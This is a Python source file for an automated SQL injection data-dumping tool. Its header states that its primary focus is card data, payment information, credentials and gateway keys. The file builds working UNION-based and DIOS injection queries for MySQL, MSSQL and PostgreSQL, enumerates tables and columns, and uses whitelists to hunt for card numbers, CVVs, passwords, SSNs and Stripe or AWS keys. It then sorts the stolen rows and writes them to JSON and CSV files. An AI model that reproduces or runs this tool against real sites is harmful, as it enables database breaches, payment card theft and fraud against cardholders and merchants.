"""
SQL Injection Data Dumper — DIOS + Targeted extraction

Extracts data from vulnerable databases using:
1. DIOS (Dump In One Shot) — single-query full schema/data extraction
2. Targeted mode — whitelist-based extraction focusing on card/payment data
3. Table/column enumeration
4. Iterative data extraction for union-based injections

Primary focus: Card data, payment info, credentials, gateway keys
"""

import re
import asyncio
import aiohttp
import csv
import json
import os
import random
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from urllib.parse import urlencode
from loguru import logger

from sqli_scanner import SQLiResult, SQLiScanner
from blind_dumper import BlindDumper, BlindDumpResult


@dataclass
class DumpedData:
    """Container for dumped database data."""
    url: str
    dbms: str
    database: str = ""
    tables: Dict[str, List[str]] = field(default_factory=dict)  # table: [columns]
    data: Dict[str, List[Dict]] = field(default_factory=dict)  # table: [{col: val}]
    card_data: List[Dict] = field(default_factory=list)
    credentials: List[Dict] = field(default_factory=list)
    gateway_keys: List[Dict] = field(default_factory=list)
    raw_dumps: List[str] = field(default_factory=list)
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    
    @property 
    def total_rows(self) -> int:
        return sum(len(rows) for rows in self.data.values())
    
    @property
    def has_valuable_data(self) -> bool:
        return bool(self.card_data or self.credentials or self.gateway_keys)


class SQLiDumper:
    """Extracts data from SQL injection vulnerable targets."""
    
    # High-value table names (whitelist for targeted mode)
    TARGET_TABLES = {
        "cards": [
            "cards", "credit_cards", "creditcards", "cc", "card_info",
            "payment_cards", "billing_cards", "card_details", "carddata",
            "stored_cards", "customer_cards", "user_cards", "payment_methods",
        ],
        "payments": [
            "payments", "payment", "transactions", "transaction", "orders",
            "order", "billing", "invoices", "invoice", "purchases",
            "checkout", "sales", "cart", "shopping_cart",
        ],
        "users": [
            "users", "user", "members", "member", "accounts", "account",
            "customers", "customer", "clients", "client", "admins", "admin",
            "administrators", "login", "logins", "auth", "wp_users",
            "user_accounts", "site_users", "tbl_users", "t_users",
        ],
        "config": [
            "config", "configuration", "settings", "options", "wp_options",
            "site_settings", "app_settings", "env", "environment",
            "api_keys", "secrets", "credentials", "keys",
        ],
    }
    
    # High-value column names (whitelist for targeted extraction)
    TARGET_COLUMNS = {
        "card_data": [
            "card_number", "cardnumber", "card_num", "cardnum", "cc_number",
            "ccnumber", "cc_num", "ccnum", "pan", "pan_number", "credit_card",
            "creditcard", "card_no", "cardno", "account_number", "acct_number",
            "debit_card", "card",
        ],
        "card_security": [
            "cvv", "cvc", "cvv2", "cvc2", "security_code", "securitycode",
            "card_code", "cardcode", "cv2", "ccv", "verification",
        ],
        "card_expiry": [
            "expiry", "expiry_date", "exp_date", "expdate", "exp_month",
            "exp_year", "expmonth", "expyear", "expiration", "expires",
            "card_expiry", "valid_thru", "valid_until", "mm_yy", "mmyy",
        ],
        "card_holder": [
            "cardholder", "card_holder", "cardholder_name", "name_on_card",
            "card_name", "billing_name", "holder_name",
        ],
        "credentials": [
            "password", "passwd", "pwd", "pass", "password_hash", "hash",
            "hashed_password", "user_pass", "user_password", "login_password",
            "secret", "pin", "passcode", "auth_token",
        ],
        "emails": [
            "email", "email_address", "mail", "user_email", "e_mail",
            "emailaddress", "contact_email",
        ],
        "usernames": [
            "username", "user_name", "login", "user_login", "uname",
            "user_id", "userid", "uid", "nickname", "display_name",
        ],
        "gateway_keys": [
            "stripe_key", "stripe_secret", "pk_live", "sk_live",
            "publishable_key", "secret_key", "api_key", "apikey",
            "api_secret", "apisecret", "merchant_id", "merchant_key",
            "private_key", "public_key", "access_token", "auth_key",
            "braintree_key", "paypal_key", "paypal_secret",
            "client_id", "client_secret", "consumer_key", "consumer_secret",
            "webhook_secret", "signing_secret",
        ],
        "billing": [
            "billing_address", "billing_city", "billing_state",
            "billing_zip", "billing_country", "billing_phone",
            "address", "city", "state", "zip", "zipcode", "postal_code",
            "country", "phone", "ssn", "social_security",
            "tax_id", "ein", "dob", "date_of_birth", "birth_date",
        ],
    }
    
    # DIOS (Dump In One Shot) queries per DBMS
    DIOS_QUERIES = {
        "mysql": (
            "(SELECT (@a) FROM (SELECT (@a:=0x00), "
            "(SELECT (@a) FROM information_schema.columns "
            "WHERE table_schema=database() AND "
            "@a:=CONCAT(@a,0x3c62723e,table_name,0x3a3a,column_name)))a)"
        ),
        "mysql_data": (
            "(SELECT (@a) FROM (SELECT (@a:=0x00), "
            "(SELECT (@a) FROM {table} "
            "WHERE @a:=CONCAT(@a,0x3c62723e,{columns}) LIMIT {limit}))a)"
        ),
        "mssql": (
            "STUFF((SELECT CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62)+"
            "table_name+CHAR(58)+CHAR(58)+column_name "
            "FROM information_schema.columns "
            "WHERE table_catalog=DB_NAME() FOR XML PATH('')),1,0,'')"
        ),
        "postgresql": (
            "array_to_string(ARRAY(SELECT table_name||'::'||column_name "
            "FROM information_schema.columns "
            "WHERE table_catalog=current_database()),chr(10))"
        ),
    }

    def __init__(self, scanner: SQLiScanner = None, output_dir: str = None,
                 max_rows: int = 500, timeout: int = 20,
                 blind_enabled: bool = True, blind_time_delay: float = 3.0,
                 blind_max_rows: int = 50):
        self.scanner = scanner or SQLiScanner(timeout=timeout)
        self.output_dir = output_dir or os.path.join(os.path.dirname(__file__), "dumps")
        self.max_rows = max_rows
        self.timeout = timeout
        self.blind_enabled = blind_enabled
        
        # Initialize blind dumper
        self.blind_dumper = BlindDumper(
            scanner=self.scanner,
            time_delay=blind_time_delay,
            max_rows=blind_max_rows,
            max_string_len=256,
            timeout=timeout,
        ) if blind_enabled else None
        
        os.makedirs(self.output_dir, exist_ok=True)
    
    def _is_target_table(self, table_name: str) -> bool:
        """Check if table name matches any high-value target."""
        table_lower = table_name.lower()
        for category, names in self.TARGET_TABLES.items():
            for name in names:
                if name in table_lower or table_lower in name:
                    return True
        return False
    
    def _is_target_column(self, column_name: str) -> Optional[str]:
        """Check if column name matches any high-value target. Returns category."""
        col_lower = column_name.lower()
        for category, names in self.TARGET_COLUMNS.items():
            for name in names:
                if name == col_lower or name in col_lower:
                    return category
        return None
    
    def _categorize_row(self, row: Dict[str, str]) -> Dict[str, List[Dict]]:
        """Categorize a data row into card_data, credentials, gateway_keys."""
        categorized = {"card_data": [], "credentials": [], "gateway_keys": []}
        
        card_entry = {}
        cred_entry = {}
        key_entry = {}
        
        for col, val in row.items():
            if not val or val.lower() in ("null", "none", ""):
                continue
            
            category = self._is_target_column(col)
            if category in ("card_data", "card_security", "card_expiry", "card_holder"):
                card_entry[col] = val
            elif category in ("credentials", "emails", "usernames"):
                cred_entry[col] = val
            elif category == "gateway_keys":
                key_entry[col] = val
            elif category == "billing":
                card_entry[col] = val  # Billing goes with card data
        
        # Also check values for patterns regardless of column names
        for col, val in row.items():
            if not val:
                continue
            val_str = str(val)
            # Stripe keys
            if re.match(r'pk_live_[A-Za-z0-9]{20,}', val_str):
                key_entry[col] = val_str
            elif re.match(r'sk_live_[A-Za-z0-9]{20,}', val_str):
                key_entry[col] = val_str
            elif re.match(r'rk_live_[A-Za-z0-9]{20,}', val_str):
                key_entry[col] = val_str
            # AWS keys
            elif re.match(r'AKIA[0-9A-Z]{16}', val_str):
                key_entry[col] = val_str
            # Card numbers (Luhn-checkable 13-19 digit numbers)
            elif re.match(r'^[3-6]\d{12,18}$', val_str.replace(" ", "").replace("-", "")):
                card_entry[col] = val_str
        
        if card_entry:
            categorized["card_data"].append(card_entry)
        if cred_entry:
            categorized["credentials"].append(cred_entry)
        if key_entry:
            categorized["gateway_keys"].append(key_entry)
        
        return categorized

    async def enumerate_tables(self, sqli: SQLiResult, 
                               session: aiohttp.ClientSession) -> List[str]:
        """Enumerate database tables through SQL injection.
        
        Args:
            sqli: SQLi vulnerability result
            session: aiohttp session
            
        Returns:
            List of table names
        """
        tables = []
        scanner = self.scanner
        base_url = sqli.url
        param = sqli.parameter
        
        base, params = scanner._parse_url(base_url)
        original = params[param][0] if isinstance(params[param], list) else params[param]
        
        # Determine injection prefix: numeric vs string
        prefix = "' "  # Default: string injection
        if original.lstrip('-').isdigit():
            prefix = " "  # Numeric — no quote needed
        elif sqli.payload_used:
            # Use scanner's detected payload to determine prefix
            p = sqli.payload_used.strip()
            if not p.startswith("'") and not p.startswith('"'):
                prefix = " "
        
        if sqli.injection_type == "union" and sqli.injectable_columns:
            null_list = ["NULL"] * sqli.column_count
            
            if sqli.dbms in ("mysql", ""):
                # MySQL: Extract from information_schema
                marker_start_str = f"mds{random.randint(10000, 99999)}"
                marker_end_str = f"mde{random.randint(10000, 99999)}"
                marker_start_hex = marker_start_str.encode().hex()
                marker_end_hex = marker_end_str.encode().hex()
                
                # Try each injectable column until one reflects
                for col_idx in sqli.injectable_columns:
                    for offset in range(0, 200, 20):
                        null_list_copy = null_list.copy()
                        null_list_copy[col_idx] = (
                            f"CONCAT(0x{marker_start_hex},"
                            f"GROUP_CONCAT(table_name SEPARATOR 0x2c),"
                            f"0x{marker_end_hex})"
                        )
                        
                        query = (
                            f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
                            f"FROM information_schema.tables "
                            f"WHERE table_schema=database() "
                            f"LIMIT {offset},20-- -"
                        )
                        
                        test_params = params.copy()
                        test_params[param] = [f"{original}{query}"]
                        test_url = scanner._build_url(base, test_params)
                    
                        body, _ = await scanner._fetch(test_url, session)
                        if body:
                            match = re.search(rf'{re.escape(marker_start_str)}(.+?){re.escape(marker_end_str)}', body)
                            if match:
                                found = match.group(1).split(",")
                                tables.extend(found)
                                if len(found) < 20:
                                    break
                            else:
                                break
                    # If we found tables with this column, stop trying others
                    if tables:
                        break
            
            elif sqli.dbms == "mssql":
                for col_idx in sqli.injectable_columns:
                    null_list_copy = null_list.copy()
                    null_list_copy[col_idx] = "name"
                    query = (
                        f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
                        f"FROM sysobjects WHERE xtype='U'-- -"
                    )
                    test_params = params.copy()
                    test_params[param] = [f"{original}{query}"]
                    test_url = scanner._build_url(base, test_params)
                    
                    body, _ = await scanner._fetch(test_url, session)
                    if body:
                        for t in re.findall(r'>\s*(\w+)\s*<', body):
                            if len(t) > 2 and t.lower() not in ("null", "tr", "td", "br", "div"):
                                tables.append(t)
                    if tables:
                        break
            
            elif sqli.dbms == "postgresql":
                for col_idx in sqli.injectable_columns:
                    null_list_copy = null_list.copy()
                    null_list_copy[col_idx] = "tablename"
                    query = (
                        f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
                        f"FROM pg_tables WHERE schemaname='public'-- -"
                    )
                    test_params = params.copy()
                    test_params[param] = [f"{original}{query}"]
                    test_url = scanner._build_url(base, test_params)
                    
                    body, _ = await scanner._fetch(test_url, session)
                    if body:
                        for t in re.findall(r'>\s*(\w+)\s*<', body):
                            if len(t) > 2 and t.lower() not in ("null", "tr", "td", "br", "div"):
                                tables.append(t)
                    if tables:
                        break
        
        # Deduplicate
        tables = list(dict.fromkeys(tables))
        logger.info(f"Enumerated {len(tables)} tables from {base_url}")
        return tables

    async def enumerate_columns(self, sqli: SQLiResult, table: str,
                                 session: aiohttp.ClientSession) -> List[str]:
        """Enumerate columns for a specific table.
        
        Args:
            sqli: SQLi vulnerability result
            table: Table name to enumerate columns for
            session: aiohttp session
            
        Returns:
            List of column names
        """
        columns = []
        scanner = self.scanner
        base, params = scanner._parse_url(sqli.url)
        original = params[sqli.parameter][0] if isinstance(params[sqli.parameter], list) else params[sqli.parameter]
        
        # Determine injection prefix
        prefix = "' "
        if original.lstrip('-').isdigit():
            prefix = " "
        elif sqli.payload_used:
            p = sqli.payload_used.strip()
            if not p.startswith("'") and not p.startswith('"'):
                prefix = " "
        
        if sqli.injection_type == "union" and sqli.injectable_columns:
            null_list = ["NULL"] * sqli.column_count
            
            if sqli.dbms in ("mysql", ""):
                marker_start_str = f"mcs{random.randint(10000, 99999)}"
                marker_end_str = f"mce{random.randint(10000, 99999)}"
                marker_start_hex = marker_start_str.encode().hex()
                marker_end_hex = marker_end_str.encode().hex()
                
                for col_idx in sqli.injectable_columns:
                    null_list_copy = null_list.copy()
                    null_list_copy[col_idx] = (
                        f"CONCAT(0x{marker_start_hex},"
                        f"GROUP_CONCAT(column_name SEPARATOR 0x2c),"
                        f"0x{marker_end_hex})"
                    )
                    
                    query = (
                        f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
                        f"FROM information_schema.columns "
                        f"WHERE table_schema=database() AND table_name='{table}'-- -"
                    )
                    
                    test_params = params.copy()
                    test_params[sqli.parameter] = [f"{original}{query}"]
                    test_url = scanner._build_url(base, test_params)
                    
                    body, _ = await scanner._fetch(test_url, session)
                    if body:
                        match = re.search(rf'{re.escape(marker_start_str)}(.+?){re.escape(marker_end_str)}', body)
                        if match:
                            columns = match.group(1).split(",")
                    if columns:
                        break
            
            elif sqli.dbms == "mssql":
                for col_idx in sqli.injectable_columns:
                    null_list_copy = null_list.copy()
                    null_list_copy[col_idx] = "column_name"
                    query = (
                        f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
                        f"FROM information_schema.columns "
                        f"WHERE table_name='{table}'-- -"
                    )
                    test_params = params.copy()
                    test_params[sqli.parameter] = [f"{original}{query}"]
                    test_url = scanner._build_url(base, test_params)
                    
                    body, _ = await scanner._fetch(test_url, session)
                    if body:
                        for c in re.findall(r'>\s*(\w+)\s*<', body):
                            if len(c) > 1 and c.lower() not in ("null", "tr", "td", "br", "div"):
                                columns.append(c)
                    if columns:
                        break
            
            elif sqli.dbms == "postgresql":
                for col_idx in sqli.injectable_columns:
                    null_list_copy = null_list.copy()
                    null_list_copy[col_idx] = "column_name"
                    query = (
                        f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
                        f"FROM information_schema.columns "
                        f"WHERE table_name='{table}'-- -"
                    )
                    test_params = params.copy()
                    test_params[sqli.parameter] = [f"{original}{query}"]
                    test_url = scanner._build_url(base, test_params)
                    
                    body, _ = await scanner._fetch(test_url, session)
                    if body:
                        for c in re.findall(r'>\s*(\w+)\s*<', body):
                            if len(c) > 1 and c.lower() not in ("null", "tr", "td", "br", "div"):
                                columns.append(c)
                    if columns:
                        break
        
        columns = list(dict.fromkeys(columns))
        logger.info(f"Enumerated {len(columns)} columns from table '{table}'")
        return columns

    async def extract_data(self, sqli: SQLiResult, table: str, columns: List[str],
                           session: aiohttp.ClientSession, limit: int = None) -> List[Dict]:
        """Extract actual data from a table using union injection.
        
        Args:
            sqli: SQLi vulnerability result
            table: Table to extract from
            columns: Columns to extract
            session: aiohttp session
            limit: Max rows to extract
            
        Returns:
            List of row dictionaries
        """
        if limit is None:
            limit = self.max_rows
        
        rows = []
        scanner = self.scanner
        base, params = scanner._parse_url(sqli.url)
        original = params[sqli.parameter][0] if isinstance(params[sqli.parameter], list) else params[sqli.parameter]
        
        if sqli.injection_type != "union" or not sqli.injectable_columns:
            return rows
        
        null_list = ["NULL"] * sqli.column_count
        
        # Determine injection prefix
        prefix = "' "
        if original.lstrip('-').isdigit():
            prefix = " "
        elif sqli.payload_used:
            p = sqli.payload_used.strip()
            if not p.startswith("'") and not p.startswith('"'):
                prefix = " "
        
        # Build CONCAT expression for all target columns
        separator = "0x7c7c"  # ||
        row_separator = "0x3c62723e"  # <br>
        
        marker_start_str = f"mdd{random.randint(10000, 99999)}"
        marker_end_str = f"mdx{random.randint(10000, 99999)}"
        marker_start_hex = marker_start_str.encode().hex()
        marker_end_hex = marker_end_str.encode().hex()
        
        if sqli.dbms in ("mysql", ""):
            concat_cols = ",".join([f"IFNULL({c},'NULL')" for c in columns])
            
            for col_idx in sqli.injectable_columns:
                found_any = False
                for offset in range(0, limit, 20):
                    null_list_copy = null_list.copy()
                    null_list_copy[col_idx] = (
                        f"CONCAT(0x{marker_start_hex},"
                        f"GROUP_CONCAT(CONCAT_WS({separator},{concat_cols}) SEPARATOR {row_separator}),"
                        f"0x{marker_end_hex})"
                    )
                
                    query = (
                        f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
                        f"FROM {table} LIMIT {offset},20-- -"
                    )
                    
                    test_params = params.copy()
                    test_params[sqli.parameter] = [f"{original}{query}"]
                    test_url = scanner._build_url(base, test_params)
                    
                    body, _ = await scanner._fetch(test_url, session)
                    if not body:
                        break
                    
                    match = re.search(rf'{re.escape(marker_start_str)}(.+?){re.escape(marker_end_str)}', body, re.S)
                    if not match:
                        break
                    
                    found_any = True
                    raw_rows = match.group(1).split("<br>")
                    batch_count = 0
                    for raw_row in raw_rows:
                        if not raw_row.strip():
                            continue
                        values = raw_row.split("||")
                        if len(values) == len(columns):
                            row = {columns[i]: values[i] for i in range(len(columns))}
                            rows.append(row)
                            batch_count += 1
                    
                    if batch_count < 20:
                        break  # No more rows
                if found_any:
                    break  # Found rows with this column, stop trying others
        
        elif sqli.dbms == "mssql":
            # MSSQL: Use FOR XML PATH
            concat_cols = "+CHAR(124)+CHAR(124)+".join([f"ISNULL(CAST({c} AS VARCHAR(MAX)),'NULL')" for c in columns])
            
            for col_idx in sqli.injectable_columns:
                null_list_copy = null_list.copy()
                null_list_copy[col_idx] = (
                    f"STUFF((SELECT TOP {limit} CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62)+"
                    f"{concat_cols} FROM {table} FOR XML PATH('')),1,0,'')"
                )
                
                query = f"{prefix}UNION ALL SELECT {','.join(null_list_copy)}-- -"
                test_params = params.copy()
                test_params[sqli.parameter] = [f"{original}{query}"]
                test_url = scanner._build_url(base, test_params)
                
                body, _ = await scanner._fetch(test_url, session)
                if body:
                    for raw_row in re.findall(r'<br>(.+?)(?=<br>|$)', body):
                        values = raw_row.split("||")
                        if len(values) == len(columns):
                            row = {columns[i]: values[i] for i in range(len(columns))}
                            rows.append(row)
                if rows:
                    break
        
        logger.info(f"Extracted {len(rows)} rows from {table} ({', '.join(columns[:5])}...)")
        return rows

    async def dios_dump(self, sqli: SQLiResult, 
                        session: aiohttp.ClientSession) -> Optional[str]:
        """Perform DIOS (Dump In One Shot) extraction.
        
        Gets complete schema (all tables and columns) in a single query.
        
        Args:
            sqli: SQLi vulnerability result
            session: aiohttp session
            
        Returns:
            Raw DIOS output string, or None
        """
        if sqli.injection_type != "union" or not sqli.injectable_columns:
            return None
        
        scanner = self.scanner
        base, params = scanner._parse_url(sqli.url)
        original = params[sqli.parameter][0] if isinstance(params[sqli.parameter], list) else params[sqli.parameter]
        
        null_list = ["NULL"] * sqli.column_count
        
        # Determine injection prefix
        prefix = "' "
        if original.lstrip('-').isdigit():
            prefix = " "
        elif sqli.payload_used:
            p = sqli.payload_used.strip()
            if not p.startswith("'") and not p.startswith('"'):
                prefix = " "
        
        dios_query = self.DIOS_QUERIES.get(sqli.dbms or "mysql")
        if not dios_query:
            return None
        
        marker_start_str = f"dio{random.randint(10000, 99999)}"
        marker_end_str = f"dix{random.randint(10000, 99999)}"
        marker_start_hex = marker_start_str.encode().hex()
        marker_end_hex = marker_end_str.encode().hex()
        
        for col_idx in sqli.injectable_columns:
            null_list_copy = null_list.copy()
            null_list_copy[col_idx] = f"CONCAT(0x{marker_start_hex},{dios_query},0x{marker_end_hex})"
            
            query = f"{prefix}UNION ALL SELECT {','.join(null_list_copy)}-- -"
            test_params = params.copy()
            test_params[sqli.parameter] = [f"{original}{query}"]
            test_url = scanner._build_url(base, test_params)
            
            body, _ = await scanner._fetch(test_url, session)
            if body:
                match = re.search(rf'{re.escape(marker_start_str)}(.+?){re.escape(marker_end_str)}', body, re.S)
                if match:
                    raw = match.group(1)
                    logger.info(f"DIOS dump successful, {len(raw)} chars extracted")
                    return raw
        
        return None

    async def targeted_dump(self, sqli: SQLiResult,
                            session: aiohttp.ClientSession) -> DumpedData:
        """Perform targeted data extraction focusing on high-value tables.
        
        Pipeline:
        1. Enumerate all tables
        2. Filter to high-value targets (cards, users, payments, config)
        3. Enumerate columns for target tables
        4. Extract data from columns matching whitelist
        5. Categorize extracted data
        
        Args:
            sqli: SQLi vulnerability result
            session: aiohttp session
            
        Returns:
            DumpedData with categorized findings
        """
        dump = DumpedData(
            url=sqli.url,
            dbms=sqli.dbms or "unknown",
            database=sqli.current_db or "",
        )
        
        # Step 1: Enumerate tables
        all_tables = await self.enumerate_tables(sqli, session)
        if not all_tables:
            logger.warning(f"No tables found for {sqli.url}")
            return dump
        
        # Step 2: Filter to high-value targets
        target_tables = [t for t in all_tables if self._is_target_table(t)]
        if not target_tables:
            # If no obvious targets, try first 10 tables
            target_tables = all_tables[:10]
            logger.info(f"No high-value tables matched, checking first {len(target_tables)}")
        else:
            logger.info(f"Found {len(target_tables)} high-value tables: {target_tables}")
        
        # Step 3+4: Enumerate columns and extract data for each target table
        for table in target_tables:
            columns = await self.enumerate_columns(sqli, table, session)
            if not columns:
                continue
            
            dump.tables[table] = columns
            
            # Filter to high-value columns
            target_cols = []
            for col in columns:
                if self._is_target_column(col):
                    target_cols.append(col)
            
            # If no specific targets, take all columns (might have non-obvious names)
            extract_cols = target_cols if target_cols else columns[:15]
            
            # Extract data
            rows = await self.extract_data(sqli, table, extract_cols, session)
            if rows:
                dump.data[table] = rows
                
                # Categorize each row
                for row in rows:
                    categorized = self._categorize_row(row)
                    dump.card_data.extend(categorized["card_data"])
                    dump.credentials.extend(categorized["credentials"])
                    dump.gateway_keys.extend(categorized["gateway_keys"])
            
            # Small delay between tables
            await asyncio.sleep(0.5)
        
        # Step 5: Try DIOS dump as backup
        dios_raw = await self.dios_dump(sqli, session)
        if dios_raw:
            dump.raw_dumps.append(dios_raw)
            
            # Parse DIOS output for table::column pairs
            for match in re.finditer(r'<br>(\w+)::(\w+)', dios_raw):
                table, column = match.group(1), match.group(2)
                if table not in dump.tables:
                    dump.tables[table] = []
                if column not in dump.tables[table]:
                    dump.tables[table].append(column)
        
        logger.info(f"Targeted dump complete for {sqli.url}: "
                    f"{len(dump.card_data)} card entries, "
                    f"{len(dump.credentials)} credentials, "
                    f"{len(dump.gateway_keys)} gateway keys, "
                    f"{dump.total_rows} total rows")
        
        return dump

    def save_dump(self, dump: DumpedData, prefix: str = "") -> Dict[str, str]:
        """Save dumped data to files.
        
        Args:
            dump: DumpedData to save
            prefix: Optional filename prefix
            
        Returns:
            Dict of {type: filepath} for saved files
        """
        saved = {}
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        domain = re.sub(r'[^\w]', '_', dump.url.split("/")[2] if "/" in dump.url else "unknown")
        base_name = f"{prefix}{domain}_{timestamp}" if prefix else f"{domain}_{timestamp}"
        
        # Save card data
        if dump.card_data:
            filepath = os.path.join(self.output_dir, f"{base_name}_cards.json")
            with open(filepath, "w") as f:
                json.dump({
                    "source": dump.url,
                    "dbms": dump.dbms,
                    "database": dump.database,
                    "timestamp": dump.timestamp,
                    "count": len(dump.card_data),
                    "data": dump.card_data,
                }, f, indent=2)
            saved["cards"] = filepath
            logger.info(f"Saved {len(dump.card_data)} card entries to {filepath}")
        
        # Save credentials
        if dump.credentials:
            filepath = os.path.join(self.output_dir, f"{base_name}_creds.json")
            with open(filepath, "w") as f:
                json.dump({
                    "source": dump.url,
                    "dbms": dump.dbms,
                    "database": dump.database,
                    "timestamp": dump.timestamp,
                    "count": len(dump.credentials),
                    "data": dump.credentials,
                }, f, indent=2)
            saved["credentials"] = filepath
        
        # Save gateway keys
        if dump.gateway_keys:
            filepath = os.path.join(self.output_dir, f"{base_name}_keys.json")
            with open(filepath, "w") as f:
                json.dump({
                    "source": dump.url,
                    "dbms": dump.dbms,
                    "database": dump.database,
                    "timestamp": dump.timestamp,
                    "count": len(dump.gateway_keys),
                    "data": dump.gateway_keys,
                }, f, indent=2)
            saved["gateway_keys"] = filepath
        
        # Save all data as CSV
        if dump.data:
            filepath = os.path.join(self.output_dir, f"{base_name}_full.csv")
            with open(filepath, "w", newline="") as f:
                writer = None
                for table, rows in dump.data.items():
                    for row in rows:
                        row_with_table = {"_table": table, **row}
                        if writer is None:
                            writer = csv.DictWriter(f, fieldnames=row_with_table.keys())
                            writer.writeheader()
                        writer.writerow(row_with_table)
            saved["full_csv"] = filepath
        
        # Save raw DIOS dump
        if dump.raw_dumps:
            filepath = os.path.join(self.output_dir, f"{base_name}_dios.txt")
            with open(filepath, "w") as f:
                f.write("\n\n---\n\n".join(dump.raw_dumps))
            saved["dios"] = filepath
        
        # Save schema
        if dump.tables:
            filepath = os.path.join(self.output_dir, f"{base_name}_schema.json")
            with open(filepath, "w") as f:
                json.dump({
                    "source": dump.url,
                    "dbms": dump.dbms,
                    "database": dump.database,
                    "tables": dump.tables,
                }, f, indent=2)
            saved["schema"] = filepath
        
        return saved

    # ==================== BLIND DUMPING ====================

    async def blind_targeted_dump(self, sqli: SQLiResult,
                                   session: aiohttp.ClientSession,
                                   progress_callback=None) -> DumpedData:
        """Perform blind data extraction for boolean/time-based SQLi.
        
        Delegates to BlindDumper for char-by-char extraction, then converts
        the result to DumpedData for pipeline compatibility.
        
        Args:
            sqli: SQLiResult with boolean or time injection_type
            session: aiohttp session
            progress_callback: Optional async callback for progress updates
            
        Returns:
            DumpedData with extracted findings (same format as targeted_dump)
        """
        if not self.blind_dumper:
            logger.warning("Blind dumper not initialized")
            return DumpedData(url=sqli.url, dbms=sqli.dbms or "unknown")
        
        if sqli.injection_type not in ("boolean", "time"):
            logger.warning(f"blind_targeted_dump called with {sqli.injection_type}, skipping")
            return DumpedData(url=sqli.url, dbms=sqli.dbms or "unknown")
        
        logger.info(f"Starting blind {sqli.injection_type} dump for {sqli.url}")
        
        blind_result = await self.blind_dumper.blind_dump(
            sqli=sqli,
            session=session,
            progress_callback=progress_callback,
        )
        
        # Convert BlindDumpResult → DumpedData for pipeline compat
        return self._convert_blind_result(blind_result)

    def _convert_blind_result(self, blind: BlindDumpResult) -> DumpedData:
        """Convert BlindDumpResult to DumpedData for compatibility."""
        dump = DumpedData(
            url=blind.url,
            dbms=blind.dbms,
            database=blind.database,
            tables=blind.tables,
            data=blind.data,
            card_data=blind.card_data,
            credentials=blind.credentials,
            gateway_keys=blind.gateway_keys,
        )
        
        # Log stats
        stats = blind.stats
        logger.info(
            f"Blind dump stats: {stats.requests_made} requests, "
            f"{stats.chars_extracted} chars, {stats.tables_found} tables, "
            f"{stats.rows_extracted} rows in {stats.elapsed:.0f}s "
            f"({stats.requests_per_sec:.1f} req/s)"
        )
        
        return dump
